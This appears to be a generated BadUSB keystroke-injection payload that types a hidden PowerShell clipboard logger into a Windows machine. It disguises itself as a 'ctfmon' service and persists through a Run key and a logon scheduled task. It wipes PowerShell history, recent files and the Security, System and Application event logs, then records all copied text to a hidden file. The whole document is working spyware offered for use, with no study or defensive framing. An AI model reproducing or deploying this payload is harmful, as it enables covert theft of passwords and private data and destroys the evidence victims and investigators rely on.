REM ╔══════════════════════════════════════════════════════════════╗
REM ║  Clipboard Logger + Persistence                            ║
REM ║  Generated by Pen15 BadUSB Wizard                          ║
REM ║  Self-hiding, persistent, logs ALL clipboard changes       ║
REM ╚══════════════════════════════════════════════════════════════╝
REM  Target: {{computer_name}}

DELAY 1500
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
ENTER
DELAY 2000

REM ── Self-hide ──
STRING $hideDir = "$env:ProgramData\Microsoft\Windows\"
ENTER
STRING if (!(Test-Path $hideDir)) { New-Item -Path $hideDir -ItemType Directory -Force | Out-Null }
ENTER
STRING $myPath = $hideDir + "ctfmon_svc.ps1"
ENTER
STRING if ($MyInvocation.MyCommand.Path -ne $myPath) {
ENTER
STRING   Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $myPath -Force
ENTER
STRING   Set-ItemProperty $myPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
ENTER
STRING   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "CtfmonSvc" /t REG_SZ /d "powershell -w hidden -ExecutionPolicy Bypass -File `"$myPath`"" /f 2>$null
ENTER
STRING   schtasks /create /tn "CtfmonSvcTask" /tr "powershell -w hidden -ExecutionPolicy Bypass -File `"$myPath`"" /sc onlogon /f 2>$null
ENTER
STRING   Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
ENTER
STRING   Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
ENTER
STRING   wevtutil cl Security 2>$null; wevtutil cl System 2>$null; wevtutil cl Application 2>$null
ENTER
STRING   Start-Process powershell -ArgumentList "-w hidden -ExecutionPolicy Bypass -File `"$myPath`"" -WindowStyle Hidden
ENTER
STRING   exit
ENTER
STRING }
ENTER

REM ── Clipboard capture loop ──
STRING $logPath = "$hideDir\cliplog_{{computer_name}}.txt"
ENTER
STRING Set-ItemProperty $logPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue
ENTER
STRING $lastClip = ""
ENTER
STRING Add-Type -AssemblyName System.Windows.Forms
ENTER
STRING while ($true) {
ENTER
STRING   $current = [System.Windows.Forms.Clipboard]::GetText()
ENTER
STRING   if ($current -and $current -ne $lastClip) {
ENTER
STRING     $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
ENTER
STRING     $entry = "[$ts] $($current.Substring(0, [Math]::Min($current.Length, 2000)))"
ENTER
STRING     [System.IO.File]::AppendAllText($logPath, "$entry`r`n")
ENTER
STRING     $lastClip = $current
ENTER
STRING   }
ENTER
STRING   Start-Sleep -Milliseconds 500
ENTER
STRING }
REM ══════════════════════════════════════════════════════════════
REM Clipboard logger: hidden, persistent, logs all copied text
REM Log: %ProgramData%\Microsoft\Windows\cliplog_{{computer_name}}.txt
REM ══════════════════════════════════════════════════════════════
